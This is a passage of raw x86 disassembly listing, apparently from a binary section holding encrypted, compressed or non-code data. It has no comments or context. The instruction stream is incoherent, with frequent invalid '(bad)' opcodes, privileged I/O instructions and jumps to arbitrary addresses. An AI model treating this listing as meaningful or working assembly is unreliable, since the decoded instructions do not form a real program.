  404769:	cli    
  40476a:	adc    edi,DWORD PTR [ecx-0x24c22d89]
  404770:	push   es
  404771:	push   ss
  404772:	push   eax
  404773:	adc    DWORD PTR [ebx+edx*1-0x6b0f0857],esi
  40477a:	and    edx,DWORD PTR [eax]
  40477c:	(bad)  
  40477d:	mov    esp,DWORD PTR [ebx]
  40477f:	pusha  
  404780:	push   eax
  404781:	ins    DWORD PTR es:[edi],dx
  404782:	cmp    esp,DWORD PTR [esi+ecx*4-0x25]
  404786:	mov    ds:0x3100b785,eax
  40478b:	popa   
  40478c:	daa    
  40478d:	cwde   
  40478e:	sub    bh,BYTE PTR [edi+edx*8-0x38]
  404792:	mov    ebp,0x9991ce79
  404797:	mov    ch,0x5c
  404799:	jmp    0x3109ac28
  40479e:	sub    eax,ebp
  4047a0:	pop    edx
  4047a1:	xchg   DWORD PTR [eax+0x47edb1a6],edi
  4047a7:	push   edi
  4047a8:	inc    esp
  4047a9:	in     eax,0x9d
  4047ab:	mov    esp,0xea1deccb
  4047b0:	sub    ecx,edx
  4047b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047b3:	push   edi
  4047b4:	cs push edx
  4047b6:	mov    dh,0x77
  4047b8:	mov    dl,0x1c
  4047ba:	lock pop esp
  4047bc:	push   cs
  4047bd:	fcom   QWORD PTR [edi]
  4047bf:	mov    esi,DWORD PTR [edx]
  4047c1:	push   eax
  4047c2:	mov    ds:0x385ff90b,eax
  4047c7:	(bad)  
  4047c8:	aas    
  4047c9:	cld    
  4047ca:	ret    
  4047cb:	xchg   edx,eax
  4047cc:	pop    ss
  4047cd:	mov    ebp,0x1c336644
  4047d2:	mov    bl,0xfe
  4047d4:	repz push esi
  4047d6:	stos   BYTE PTR es:[edi],al
  4047d7:	add    DWORD PTR [esi+0x3c],ecx
  4047da:	scas   al,BYTE PTR es:[edi]
  4047db:	adc    BYTE PTR [esi],dl
  4047dd:	bound  eax,QWORD PTR [esi]
  4047df:	sbb    eax,0x1916bc5d
  4047e4:	jns    0x404851
  4047e6:	dec    esi
  4047e7:	add    al,0x88
  4047e9:	icebp  
  4047ea:	dec    esi
  4047eb:	(bad)  
  4047ec:	hlt    
  4047ed:	adc    DWORD PTR cs:[edi+0x2],ebp
  4047f1:	mov    dl,0x17
  4047f3:	cmp    ch,BYTE PTR [eax]
  4047f5:	scas   al,BYTE PTR es:[edi]
  4047f6:	push   esp
  4047f7:	dec    edi
  4047f8:	dec    esp
  4047f9:	dec    edi
  4047fa:	fdiv   DWORD PTR [ebx+0x51caff34]
  404800:	adc    eax,0x9adb72f7
  404805:	(bad)  
  404806:	stc    
  404807:	pop    ebp
  404808:	int3   
  404809:	aad    0x47
  40480b:	dec    ebp
  40480c:	xor    bl,BYTE PTR [ecx+0x0]
  40480f:	pusha  
  404810:	dec    edx
  404811:	mov    dl,0x41
  404813:	cmp    DWORD PTR [ecx],edx
  404815:	arpl   WORD PTR [edi-0x13e486f3],di
  40481b:	imul   eax,DWORD PTR [edx+0x47],0xffffffd7
  40481f:	and    eax,0xfa27fd0e
  404824:	jg     0x40482f
  404826:	leave  
  404827:	shl    bl,cl
  404829:	stos   BYTE PTR es:[edi],al
  40482a:	lahf   
  40482b:	retf   
  40482c:	dec    esp
  40482d:	xor    dh,cl
  40482f:	pop    edx
  404830:	mov    BYTE PTR ds:0xebe25996,bl
  404836:	add    al,0xb1
  404838:	ror    BYTE PTR [ebp+0x4b],1
  40483b:	jb     0x40483d
  40483d:	pusha  
  40483e:	push   ebp
  40483f:	nop
  404840:	push   0xffffffad
  404842:	sbb    DWORD PTR cs:[edx+0x59],ebx
  404846:	nop
  404847:	mov    esi,DWORD PTR [ecx+0x7d]
  40484a:	fsubr  QWORD PTR [eax]
  40484c:	fucomp st(1)
  40484e:	xchg   ebx,eax
  40484f:	inc    ebp
  404850:	xchg   esi,eax
  404851:	jp     0x404820
  404853:	das    
  404854:	(bad)  
  404856:	sbb    eax,0x32ef390c
  40485b:	sti    
  40485c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40485d:	sahf   
  40485e:	xchg   ebx,eax
  40485f:	add    BYTE PTR [ebp+esi*8-0x4c177057],al
  404866:	(bad)  
  404867:	dec    ebp
  404868:	cmp    ebp,edi
  40486a:	test   BYTE PTR [esp+esi*8-0x1d],ah
  40486e:	pushf  
  40486f:	sub    edx,eax
  404871:	fs addr16 pop ss
  404874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404875:	mov    BYTE PTR [ecx],bh
  404877:	inc    esi
  404878:	pop    ebp
  404879:	test   eax,0x95c50ac1
  40487e:	sbb    BYTE PTR [ecx],bl
  404880:	inc    esp
  404881:	stc    
  404882:	out    0x9f,eax
  404884:	jmp    0x8df:0x416c3ace
  40488b:	cmp    al,dh
  40488d:	mov    cl,0xee
  40488f:	mov    bl,al
  404891:	jmp    0xb6aa0501
  404896:	adc    ecx,esp
  404898:	shl    BYTE PTR [esi+edi*2+0x39],1
  40489c:	stos   BYTE PTR es:[edi],al
  40489d:	fild   DWORD PTR [eax]
  40489f:	fsubr  DWORD PTR [ecx-0x40]
  4048a2:	jl     0x4048da
  4048a4:	mov    esp,0x93b444e2
  4048a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048aa:	outs   dx,DWORD PTR ds:[esi]
  4048ab:	or     eax,0x15db4280
  4048b0:	(bad)  
  4048b1:	dec    ebx
  4048b2:	stos   DWORD PTR es:[edi],eax
  4048b3:	fnstsw WORD PTR [ecx-0x3f40d483]
  4048b9:	xchg   esp,eax
  4048ba:	aam    0xc4
  4048bc:	fsubp  st(2),st
  4048be:	loope  0x4048e2
  4048c0:	adc    eax,0xfbe4c11
  4048c5:	xchg   BYTE PTR [ebp-0x20],ch
  4048c8:	into   
  4048c9:	mov    WORD PTR ds:0xc998895b,cs
  4048cf:	ins    BYTE PTR es:[edi],dx
  4048d0:	sbb    eax,0x9f7f8e07
  4048d5:	aas    
  4048d6:	and    dh,BYTE PTR [ecx+0x2c]
  4048d9:	fwait
  4048da:	call   0xd2f2825c
  4048df:	dec    ebx
  4048e0:	or     al,0xa1
  4048e3:	(bad)  
  4048e4:	out    0xc8,eax
  4048e6:	sub    al,0x99
  4048e8:	push   esp
  4048e9:	jo     0x404915
  4048eb:	jno    0x404878
  4048ed:	hlt    
  4048ee:	and    ecx,edi
  4048f0:	add    al,0x5d
  4048f2:	fist   WORD PTR [eax+ebx*2+0x76]
  4048f6:	adc    BYTE PTR [ebx+0x13],bl
  4048f9:	lea    edi,ds:0x54e44dee
  4048ff:	dec    eax
  404900:	sbb    eax,0xd36999e2
  404905:	mov    ecx,0x1d5f167d
  40490a:	popf   
  40490b:	dec    esp
  40490c:	dec    edi
  40490d:	xlat   BYTE PTR ds:[ebx]
  40490e:	inc    ebp
  40490f:	xor    eax,0xc68e83e5
  404914:	in     al,0xbf
  404916:	(bad)  
  404917:	mov    eax,0x567639f5
  40491c:	mov    esi,DWORD PTR [edi]
  40491e:	int    0x1e
  404920:	lods   al,BYTE PTR ds:[esi]
  404921:	pushf  
  404922:	mov    ch,0x83
  404924:	inc    esi
  404925:	in     eax,0x38
  404927:	int    0xb1
  404929:	ror    BYTE PTR cs:[edx+0x12719860],cl
  404930:	pushf  
  404931:	imul   edi,DWORD PTR [edx+ecx*4-0x2806adde],0xffffff8e
  404939:	cmp    BYTE PTR [ebx],dl
  40493b:	mov    ecx,0x12842b6f
  404940:	shr    BYTE PTR [ecx-0x3c8c9a19],1
  404946:	xchg   BYTE PTR [ecx-0x14],cl
  404949:	xor    al,0xf3
  40494b:	pop    esp
  40494c:	dec    esi
  40494d:	xchg   BYTE PTR [ebp-0x16d21e1a],dh
  404953:	mov    edx,DWORD PTR [edi-0x151c2a43]
  404959:	xor    esp,DWORD PTR [ecx-0x36]
  40495c:	inc    ebp
  40495d:	adc    esp,edx
  40495f:	sbb    edi,DWORD PTR [ecx]
  404961:	xchg   DWORD PTR [edx+0x5c01e139],esi
  404967:	jge    0x4048fe
  404969:	and    eax,0x7797d6a8
  40496e:	add    ah,BYTE PTR [ecx-0x29a3e821]
  404974:	fdiv   DWORD PTR [edx]
  404976:	retf   
  404977:	int    0x21
  404979:	sub    al,0x2d
  40497b:	das    
  40497c:	fsub   DWORD PTR [esi]
  40497e:	xchg   edi,eax
  40497f:	inc    eax
  404980:	jp     0x40495a
  404982:	dec    ebp
  404983:	jg     0x40495c
  404985:	in     eax,0x8c
  404987:	mov    ah,BYTE PTR ds:0xadf05e56
  40498d:	cdq    
  40498e:	(bad)  
  40498f:	das    
  404990:	cmp    DWORD PTR [ecx],ebp
  404992:	dec    ecx
  404993:	fmul   QWORD PTR [ecx]
  404995:	ins    BYTE PTR es:[edi],dx
  404996:	aaa    
  404997:	cmp    ecx,DWORD PTR [ebx-0x54]
  40499a:	sub    esp,DWORD PTR [edi]
  40499c:	lods   eax,DWORD PTR ds:[esi]
  40499d:	xor    al,0x8f
  40499f:	imul   ebp,DWORD PTR ds:0x597995c7,0x1d
  4049a6:	(bad)  
  4049a8:	repz jle 0x40492c
  4049ab:	bound  ebx,QWORD PTR [ecx+0x936245]
  4049b1:	mov    ds:0xf727bb36,al
  4049b6:	inc    edi
  4049b7:	mov    cs:0xf0dcdbf1,eax
  4049bd:	loope  0x4049a0
  4049bf:	shl    BYTE PTR [eax],0x3
  4049c2:	adc    DWORD PTR [esi],0x38d25292
  4049c8:	jb     0x40496c
  4049ca:	int    0xcf
  4049cc:	test   DWORD PTR [esp+edx*1+0x37],ecx
  4049d0:	cdq    
  4049d1:	jno    0x404a51
  4049d3:	jmp    0x404996
  4049d5:	sbb    dl,bh
  4049d7:	adc    DWORD PTR [esi-0x36a8f22d],edx
  4049dd:	dec    eax
  4049de:	mov    ah,BYTE PTR [eax-0x752c3e1b]
  4049e4:	dec    ebx
  4049e5:	or     ebx,DWORD PTR [edx+0x305ef785]
  4049eb:	mov    ah,0xd7
  4049ed:	sbb    BYTE PTR [eax+0x682429df],al
  4049f3:	fst    st(5)
  4049f5:	gs inc ebp
  4049f7:	test   DWORD PTR [ebx+ebp*8],edi
  4049fa:	push   ds
  4049fb:	jl     0x404a59
  4049fd:	psubq  mm4,QWORD PTR [esi]
  404a00:	and    bl,0xbb
  404a03:	inc    edx
  404a04:	data16 hlt 
  404a06:	jp     0x4049b0
  404a08:	aam    0xde
  404a0a:	push   es
  404a0b:	push   esp
  404a0c:	inc    esp
  404a0d:	out    dx,al
  404a0e:	adc    eax,0x2f1128f1
  404a13:	inc    ecx
  404a14:	daa    
  404a15:	adc    dh,bl
  404a17:	cdq    
  404a18:	imul   ebp,esp,0x63
  404a1b:	shl    DWORD PTR [esi-0x64d1a9d7],0x54
  404a22:	jge    0x4049a7
  404a24:	xor    BYTE PTR [ebp-0x3691bd80],ah
  404a2a:	bound  eax,QWORD PTR [ecx-0x2cc4b2a0]
  404a30:	add    BYTE PTR [ebx+0x4e],cl
  404a33:	adc    esp,ecx
  404a35:	out    dx,al
  404a36:	sub    al,0x6c
  404a38:	jge    0x404a15
  404a3a:	fcomi  st,st(5)
  404a3c:	xchg   ebp,eax
  404a3d:	and    eax,0x38b176e6
  404a42:	(bad)  
  404a43:	and    eax,0x22d5a0f7
  404a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a49:	pop    ecx
  404a4a:	fst    DWORD PTR ds:0x6040e405
  404a50:	jle    0x404a29
  404a52:	lods   eax,DWORD PTR ds:[esi]
  404a53:	cmc    
  404a54:	sti    
  404a55:	aaa    
  404a56:	pusha  
  404a57:	shr    ebp,1
  404a59:	mov    ch,0xc7
  404a5b:	loop   0x404a8a
  404a5d:	jmp    0x13a2948a
  404a62:	adc    ebx,edx
  404a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a65:	les    edi,FWORD PTR [ebx+0x66a9588d]
  404a6b:	cmp    BYTE PTR [ebx],al
  404a6d:	inc    eax
  404a6e:	mov    edx,0x51a0f161
  404a73:	dec    edi
  404a74:	sbb    eax,0xb5a047b0
  404a79:	fisubr WORD PTR [ebp-0x2b9a2035]
  404a7f:	rcr    dh,1
  404a81:	mov    ebp,0xad445b55
  404a86:	retf   0xe9ba
  404a89:	in     al,dx
  404a8a:	js     0x404a9e
  404a8c:	sub    BYTE PTR [esi-0x2],dl
  404a8f:	aad    0x56
  404a91:	adc    al,BYTE PTR [esi-0x47c47499]
  404a97:	iret   
  404a98:	and    eax,0x332ea09f
  404a9d:	(bad)  
  404a9e:	xlat   BYTE PTR ds:[ebx]
  404a9f:	in     eax,dx
  404aa0:	scas   eax,DWORD PTR es:[edi]
  404aa1:	add    BYTE PTR [edi],dl
  404aa3:	lock pop esi
  404aa5:	mov    dh,0x8f
  404aa7:	and    DWORD PTR [edx],edi
  404aa9:	push   ds
  404aaa:	addr16 jg 0x404b1d
  404aad:	inc    ebx
  404aae:	mov    esi,0x74fc77f6
  404ab3:	mov    esp,0xb791cf2
  404ab8:	pop    ebx
  404ab9:	dec    edi
  404aba:	pop    eax
  404abb:	mov    ds:0xabd5c2c3,eax
  404ac0:	jmp    0x2940:0x684bfd18
  404ac7:	sahf   
  404ac8:	push   ds
  404ac9:	cmovae edx,esp
  404acc:	push   ebp
  404acd:	gs jns 0x404b13
  404ad0:	dec    eax
  404ad1:	mov    bl,0xe
  404ad3:	loop   0x404b37
  404ad5:	stc    
  404ad6:	retf   0xa761
  404ad9:	jecxz  0x404b57
  404adb:	xor    bl,BYTE PTR [ecx]
  404add:	jp     0x404a75
  404adf:	loope  0x404a8b
  404ae1:	jnp    0x404a93
  404ae3:	dec    eax
  404ae4:	cld    
  404ae5:	(bad)  
  404ae6:	sahf   
  404ae7:	push   esp
  404ae8:	mov    cl,0x45
  404aea:	hlt    
  404aeb:	jns    0x404b16
  404aed:	mov    al,0xac
  404aef:	xor    esi,DWORD PTR [edi-0x28]
  404af2:	daa    
  404af3:	pop    ss
  404af4:	sub    bh,cl
  404af6:	cmc    
  404af7:	int3   
  404af8:	xchg   DWORD PTR [edi],ecx
  404afa:	test   DWORD PTR [ecx+0x59],eax
  404afd:	minps  xmm5,XMMWORD PTR [ebx+ebx*8]
  404b01:	addr16 imul eax,esi,0xfffffff5
  404b05:	fcomp  DWORD PTR [ebp-0x2d47eaef]
  404b0b:	jge    0x404aef
  404b0d:	pop    ecx
  404b0e:	mov    DWORD PTR [esi-0x6535b2a1],edx
  404b14:	(bad)  
  404b15:	ds adc bl,dh
  404b18:	and    al,cl
  404b1a:	dec    ecx
  404b1b:	jle    0x404b7e
  404b1d:	adc    al,0xa4
  404b1f:	push   ss
  404b20:	mov    dh,0x20
  404b22:	xor    al,0x99
  404b24:	in     eax,0x6c
  404b26:	push   ds
  404b27:	fild   DWORD PTR [esi]
  404b29:	cli    
  404b2a:	shl    ah,0xf7
  404b2d:	add    BYTE PTR [edx],bl
  404b2f:	xchg   edi,eax
  404b30:	push   ecx
  404b31:	fs aas 
  404b33:	pusha  
  404b34:	or     dl,dh
  404b36:	sar    BYTE PTR [esi+0x7b1c4595],0xf6
  404b3d:	and    eax,0xbfd3c86b
  404b42:	call   0x4307:0x56545bb8
  404b49:	(bad)  
  404b4a:	add    dh,BYTE PTR [edi+0x6c]
  404b4d:	icebp  
  404b4e:	cmp    edi,esi
  404b50:	mov    al,ah
  404b52:	pop    esp
  404b53:	in     eax,dx
  404b54:	(bad)  
  404b55:	jecxz  0x404b21
  404b57:	iret   
  404b58:	(bad)  
  404b59:	neg    BYTE PTR [edx+esi*1-0x50a525ee]
  404b60:	sti    
  404b61:	enter  0xa839,0xc0
  404b65:	hlt    
  404b66:	cli    
  404b67:	fdiv   QWORD PTR ds:0x9c99cf85
  404b6d:	popf   
  404b6e:	in     eax,0xf8
  404b70:	aaa    
  404b71:	mov    cl,0xd0
  404b73:	mov    cl,0x74
  404b75:	ss jl  0x404b46
  404b78:	push   edx
  404b79:	push   esp
  404b7a:	mov    eax,ds:0xdc20ca92
  404b7f:	or     dh,BYTE PTR [edi-0x4e8aea66]
  404b85:	sub    al,BYTE PTR [ecx]
  404b87:	adc    al,0x29
  404b89:	pushf  
  404b8a:	mov    dh,0xe4
  404b8c:	leave  
  404b8d:	stc    
  404b8e:	inc    ebp
  404b8f:	pushw  ss
  404b91:	sbb    al,0x19
  404b93:	les    eax,FWORD PTR [esi-0x41a3aec7]
  404b99:	pusha  
  404b9a:	out    0xa0,al
  404b9c:	dec    edx
  404b9d:	int3   
  404b9e:	inc    edi
  404b9f:	jl     0x404c01
  404ba1:	cmp    ah,BYTE PTR [esi]
  404ba3:	cmp    eax,0x96f9d687
  404ba8:	stos   BYTE PTR es:[edi],al
  404ba9:	push   ebx
  404baa:	and    eax,0xa94e7dd7
  404baf:	and    al,0xc0
  404bb1:	shr    BYTE PTR [edi],0x29
  404bb4:	xor    BYTE PTR [edx+0x1d],cl
  404bb7:	push   0x6
  404bb9:	imul   ecx,DWORD PTR [ecx-0xa51226d],0xfffffff8
  404bc0:	mov    bl,0x4a
  404bc2:	dec    edx
  404bc3:	repz cs popf 
  404bc6:	fsub   st,st(3)
  404bc8:	leave  
  404bc9:	in     eax,0x95
  404bcb:	push   ebp
  404bcc:	icebp  
  404bcd:	mov    WORD PTR [edi],ds
  404bcf:	add    BYTE PTR [edi+0x3],al
  404bd2:	(bad)  
  404bd4:	add    DWORD PTR [ebx+0x2dd55ba2],ebp
  404bda:	shr    BYTE PTR [ecx-0x7b9a4ede],cl
  404be0:	lds    eax,FWORD PTR [edi-0x5a]
  404be3:	stos   BYTE PTR es:[edi],al
  404be4:	jl     0x404bd3
  404be6:	ds out 0x99,eax
  404be9:	or     eax,esi
  404beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bec:	fcmove st,st(6)
  404bee:	xchg   esp,eax
  404bef:	xor    eax,0x4e6ca1f8
  404bf4:	and    BYTE PTR [ebp+esi*2-0x46e9260],bh
  404bfb:	popf   
  404bfc:	mov    edi,0xcf1b8700
  404c01:	dec    ebx
  404c02:	add    esp,DWORD PTR [eax+0x4f]
  404c05:	in     eax,dx
  404c06:	out    0x7e,eax
  404c08:	lds    ebp,FWORD PTR [ebx-0x64]
  404c0b:	mov    ebp,0x888dda57
  404c10:	push   edi
  404c11:	rol    DWORD PTR [esi-0x74247ece],0x79
  404c18:	cmp    ebx,DWORD PTR [ecx-0x28]
  404c1b:	imul   edi,DWORD PTR [edx+ecx*1],0x5f4e8a96
  404c22:	cmp    ch,BYTE PTR [esi]
  404c24:	scas   al,BYTE PTR es:[edi]
  404c25:	in     al,dx
  404c26:	jno    0x404ca5
  404c28:	outs   dx,DWORD PTR ds:[esi]
  404c29:	das    
  404c2a:	pop    ebx
  404c2b:	xchg   esp,eax
  404c2c:	or     edx,DWORD PTR [edx-0x7e]
  404c2f:	clc    
  404c30:	adc    bh,ah
  404c32:	add    ebp,ecx
  404c34:	das    
  404c35:	jp     0x404bef
  404c37:	xor    DWORD PTR ss:[ebx+0x2cb05b2c],ebp
  404c3e:	call   0xc96c:0xfa9c75db
  404c45:	or     eax,0x41269b10
  404c4a:	aam    0x9
  404c4c:	cs (bad) 
  404c4e:	jle    0x404c61
  404c50:	retf   0x41a7
  404c53:	mov    esi,0x23f0f641
  404c58:	inc    ebp
  404c59:	out    dx,eax
  404c5a:	inc    eax
  404c5b:	jmp    0x6e24:0x190c28bd
  404c62:	and    bh,BYTE PTR [edx+0x6f01d8e0]
  404c68:	mov    eax,0xa87be8e9
  404c6d:	(bad)  
  404c6e:	mov    edi,0x1c658486
  404c73:	pusha  
  404c74:	add    ebp,DWORD PTR [eax]
  404c76:	mov    ah,0x42
  404c78:	nop
  404c79:	nop
  404c7a:	xchg   edi,edx
  404c7c:	adc    DWORD PTR [ebx-0x969e8ec],edi
  404c82:	cmp    ebx,DWORD PTR [esi+ecx*4+0x25]
  404c86:	adc    al,0xe5
  404c88:	xchg   ch,ch
  404c8a:	jbe    0x404c55
  404c8c:	sub    bh,BYTE PTR [ecx]
  404c8e:	pusha  
  404c8f:	test   DWORD PTR [esp+esi*8],eax
  404c92:	add    ah,BYTE PTR [ecx+0x771bdcb0]
  404c98:	(bad)  
  404c99:	ret    0xcca2
  404c9c:	sub    esp,DWORD PTR ds:0x28b87e46
  404ca2:	pop    ss
  404ca3:	(bad)  
  404ca4:	adc    DWORD PTR [ebp+0x6ca44801],edi
  404caa:	jmp    0x404cd3
  404cac:	push   es
  404cad:	mov    esi,0xb87af09e
  404cb2:	jo     0x404cf2
  404cb4:	and    bh,cl
  404cb6:	xor    BYTE PTR [ebx-0x5bdf8b13],bl
  404cbc:	and    DWORD PTR [ebx+esi*1+0x1c04155d],esp
  404cc3:	jge    0x404c4c
  404cc5:	jmp    0x404cfd
  404cc7:	fisubr DWORD PTR [eax-0x33]
  404cca:	pop    edi
  404ccb:	or     eax,DWORD PTR [edi+0x4d]
  404cce:	retf   
  404ccf:	push   esi
  404cd0:	fs xchg edx,eax
  404cd2:	xchg   ebp,eax
  404cd3:	sub    ah,BYTE PTR [edx+edi*8]
  404cd6:	test   eax,0xbd861bbf
  404cdb:	out    0x82,al
  404cdd:	inc    ecx
  404cde:	jmp    0x404ccb
  404ce0:	fwait
  404ce1:	idiv   cl
  404ce3:	daa    
  404ce4:	(bad)  
  404ce5:	sahf   
  404ce6:	mov    ?,WORD PTR [eax+0x1790d7f]
  404cec:	int    0x5b
  404cee:	push   edi
  404cef:	jns    0x404d13
  404cf1:	push   0x25
  404cf3:	fucomp st(6)
  404cf5:	(bad)  
  404cf6:	jge    0x404d31
  404cf8:	loopne 0x404c81
  404cfa:	inc    ecx
  404cfb:	dec    ecx
  404cfc:	mov    DWORD PTR [ecx],ebx
  404cfe:	and    eax,0x78c7496f
  404d03:	sbb    DWORD PTR [edi],edi
  404d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d06:	jmp    0x5e0b:0x22acec7b
  404d0d:	sti    
  404d0e:	adc    DWORD PTR [ebp-0x44faf8d2],esi
  404d14:	adc    al,0x2f
  404d16:	jo     0x404d01
  404d18:	popa   
  404d19:	ror    BYTE PTR [si-0x6d],1
  404d1d:	scas   eax,DWORD PTR es:[edi]
  404d1e:	rcl    BYTE PTR [edi-0x1355d37e],1
  404d24:	cmp    BYTE PTR [eax+esi*1-0x34],bh
  404d28:	mov    bl,dl
  404d2a:	or     ecx,ecx
  404d2c:	test   ch,ch
  404d2e:	jb     0x404d04
  404d30:	mov    al,ds:0xb2f14478
  404d35:	push   esi
  404d36:	mov    ecx,0x41a01e69
  404d3b:	aad    0x65
  404d3d:	jo     0x404cc3
  404d3f:	push   ss
  404d40:	std    
  404d41:	inc    ebp
  404d42:	fild   DWORD PTR [eax+0x1c]
  404d45:	cdq    
  404d46:	sbb    esp,ecx
  404d48:	loop   0x404d6d
  404d4a:	xchg   ebx,eax
  404d4b:	xchg   BYTE PTR [edx-0x29],ah
  404d4e:	icebp  
  404d4f:	les    esp,FWORD PTR [esp+ebx*2+0x3cbf6c91]
  404d56:	cli    
  404d57:	mov    esp,DWORD PTR [esi+0x1ad99170]
  404d5d:	dec    ebx
  404d5e:	inc    edx
  404d5f:	or     ebx,DWORD PTR [esi+eax*1+0x48]
  404d63:	pop    ebp
  404d64:	mov    BYTE PTR [ebx],cl
  404d66:	fstp   QWORD PTR [eax]
  404d68:	mov    ecx,0xf86be608
  404d6d:	mov    ch,0x82
  404d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d70:	inc    ebx
  404d71:	pop    ebp
  404d72:	bound  edi,QWORD PTR [ebp-0xb5f6812]
  404d78:	ficom  WORD PTR [ebx+0x377c33f3]
  404d7e:	push   esi
  404d7f:	jbe    0x404d8c
  404d81:	jno    0x404d4a
  404d83:	scas   al,BYTE PTR es:[edi]
  404d84:	fldcw  WORD PTR [ebp-0x165dfa5b]
  404d8a:	stos   BYTE PTR es:[edi],al
  404d8b:	dec    esp
  404d8c:	push   edi
  404d8d:	loop   0x404d5d
  404d8f:	popf   
  404d90:	outs   dx,BYTE PTR ds:[esi]
  404d91:	dec    esi
  404d92:	jge    0x404d65
  404d94:	ror    DWORD PTR [ebx-0xf8a00a6],0xf4
  404d9b:	enter  0x872f,0xda
  404d9f:	pop    ds
  404da0:	das    
  404da1:	dec    esp
  404da2:	inc    eax
  404da3:	sbb    ah,BYTE PTR ds:0x6376e91c
  404da9:	aaa    
  404daa:	and    eax,0x2e40873
  404daf:	lahf   
  404db0:	and    BYTE PTR [ecx+edi*4+0x68],bh
  404db4:	int    0x5f
  404db6:	addr16 mov dl,0x71
  404db9:	or     al,0xc
  404dbb:	in     eax,0xc1
  404dbd:	in     eax,dx
  404dbe:	cdq    
  404dbf:	int3   
  404dc0:	loop   0x404dd7
  404dc2:	lock shl DWORD PTR [edx+0x77],cl
  404dc6:	dec    esi
  404dc7:	iret   
  404dc8:	outs   dx,BYTE PTR ds:[esi]
  404dc9:	jmp    0x57f17e13
  404dce:	shr    DWORD PTR [ecx+ecx*4-0x49],0x56
  404dd3:	or     al,0x87
  404dd5:	enter  0x8394,0x22
  404dd9:	bound  esp,QWORD PTR [ebp+0x759ade34]
  404ddf:	fwait
  404de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de1:	xchg   esp,eax
  404de2:	and    esi,esi
  404de4:	shl    DWORD PTR [edx+edi*4],0x60
  404de8:	int    0x75
  404dea:	push   es
  404deb:	fs push ebx
  404ded:	ins    BYTE PTR es:[edi],dx
  404dee:	pop    ss
  404def:	dec    esp
  404df0:	aad    0xf5
  404df2:	ret    
  404df3:	cmc    
  404df4:	stos   DWORD PTR es:[edi],eax
  404df5:	(bad)  
  404df6:	mov    bl,0x2c
  404df8:	xlat   BYTE PTR ds:[ebx]
  404df9:	or     esp,DWORD PTR [edi]
  404dfb:	test   BYTE PTR [eax-0x4584521],0x86
  404e02:	fimul  WORD PTR [ecx-0x2e]
  404e05:	jne    0x404e1b
  404e07:	(bad)  
  404e08:	mov    al,ds:0x1060fc8f
  404e0d:	xchg   edx,eax
  404e0e:	imul   ebp,esi,0xeed4a5e
  404e14:	adc    al,0x1a
  404e16:	loop   0x404dda
  404e18:	fnstenv [ebp+0x39]
  404e1b:	jne    0x404dab
  404e1d:	ret    
  404e1e:	add    dh,BYTE PTR [esi-0x50]
  404e21:	(bad)  
  404e22:	jge    0x404e2a
  404e24:	cld    
  404e25:	and    ebp,DWORD PTR [ebx]
  404e27:	inc    ecx
  404e28:	rcr    DWORD PTR [ebp-0x270701fd],1
  404e2e:	mov    esi,edx
  404e30:	mov    dh,0xe3
  404e32:	ss jecxz 0x404e1f
  404e35:	pop    es
  404e36:	jp     0x404e15
  404e38:	xor    DWORD PTR [ebx-0x5bac2bd],edx
  404e3e:	int    0x2a
  404e40:	in     al,dx
  404e41:	pop    ds
  404e42:	out    0x61,eax
  404e44:	push   cs
  404e45:	popw   ds
  404e47:	into   
  404e48:	or     BYTE PTR [edi],al
  404e4a:	aad    0xb2
  404e4c:	jno    0x404e9d
  404e4e:	test   eax,0xb1878aa4
  404e53:	sahf   
  404e54:	push   ebx
  404e55:	nop
  404e56:	aas    
  404e57:	sbb    ebx,DWORD PTR [edx+0x37b7b8b7]
  404e5d:	or     al,0x7d
  404e5f:	push   esp
  404e60:	icebp  
  404e61:	add    al,0xbd
  404e63:	lahf   
  404e64:	adc    eax,0x2f4e76b3
  404e69:	jle    0x404e49
  404e6b:	inc    eax
  404e6c:	pop    es
  404e6d:	ss xchg esi,eax
  404e6f:	(bad)  
  404e71:	mov    esp,0xbe0506f6
  404e76:	loopne 0x404ec8
  404e78:	xor    DWORD PTR [eax+0x1a],0xf28adf
  404e7f:	dec    esi
  404e80:	bound  edi,QWORD PTR [esi-0x2c]
  404e83:	fidiv  DWORD PTR [ebx+esi*2-0x3b]
  404e87:	outs   dx,BYTE PTR ds:[esi]
  404e88:	xchg   ebp,eax
  404e89:	xchg   esp,eax
  404e8a:	pop    ss
  404e8b:	loopne 0x404ed1
  404e8d:	stos   DWORD PTR es:[edi],eax
  404e8e:	jnp    0x404eba
  404e90:	inc    ecx
  404e91:	into   
  404e92:	mov    ebx,0x59c7b78b
  404e97:	pop    ebp
  404e98:	sub    al,0xa
  404e9a:	imul   edi,esp,0xea14c7a1
  404ea0:	dec    edi
  404ea1:	pop    esi
  404ea2:	or     al,0x42
  404ea4:	jo     0x404e65
  404ea6:	test   ebx,0x9016c6ae
  404eac:	data16 jb 0x404ebd
  404eaf:	mov    ebp,0x181635b
  404eb4:	push   edi
  404eb5:	mov    al,ds:0xc1f755f7
  404eba:	ret    0x7c97
  404ebd:	aam    0x7f
  404ebf:	mov    ebx,0x8a02ca3f
  404ec4:	sahf   
  404ec5:	pop    edx
  404ec6:	test   eax,0xd37fc160
  404ecb:	ret    0xc4ea
  404ece:	rcl    DWORD PTR [eax+0x33],1
  404ed1:	xor    DWORD PTR [edi+0x2da6cff2],edi
  404ed7:	sub    al,0xa
  404ed9:	inc    ecx
  404eda:	outs   dx,DWORD PTR ds:[esi]
  404edb:	je     0x404efc
  404edd:	inc    BYTE PTR [ebx-0x76]
  404ee0:	data16 int 0xf9
  404ee3:	in     eax,0x5
  404ee5:	hlt    
  404ee6:	and    DWORD PTR [edx+0xa],ebx
  404ee9:	out    dx,al
  404eea:	shl    DWORD PTR [ecx+edi*4-0x70b64142],cl
  404ef1:	pushf  
  404ef2:	cmp    eax,0x25f7fcb5
  404ef7:	retf   
  404ef8:	pop    edx
  404ef9:	enter  0x1371,0xf
  404efd:	icebp  
  404efe:	xor    cl,al
  404f00:	dec    esi
  404f01:	test   BYTE PTR [edi-0x3e],dl
  404f04:	cld    
